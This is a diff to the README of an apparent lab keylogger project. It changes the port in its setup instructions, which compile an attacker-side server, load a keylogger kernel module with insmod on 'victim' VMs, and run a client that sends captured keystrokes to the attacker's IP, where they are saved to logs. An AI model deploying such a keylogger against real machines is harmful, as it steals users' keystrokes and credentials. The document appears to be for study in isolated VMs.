@@ -47,7 +47,7 @@ make
 
 ```bash
 gcc server.c -o server -pthread
-./server -port 8080
+./server -port 9021
 ```
 
 ### On each victim VM
@@ -57,7 +57,7 @@ make
 gcc client.c -o client
 
 sudo insmod keylogger.ko
-./client -ip 192.168.99.10 -port 8080
+./client -ip 192.168.99.10 -port 9021
 ```
 
 Replace `192.168.99.10` with the attacker VM’s IP on the internal network.
@@ -83,14 +83,14 @@ Stop the server with `Ctrl+C` on the attacker.
 ### Terminal 1 – server
 
 ```bash
-./server -port 8080
+./server -port 9021
 ```
 
 ### Terminal 2 – victim
 
 ```bash
 sudo insmod keylogger.ko
-./client -ip 127.0.0.1 -port 8080
+./client -ip 127.0.0.1 -port 9021
 ```
 
 Type on the victim machine. Keystrokes should appear in the server terminal and be saved under `logs/`.
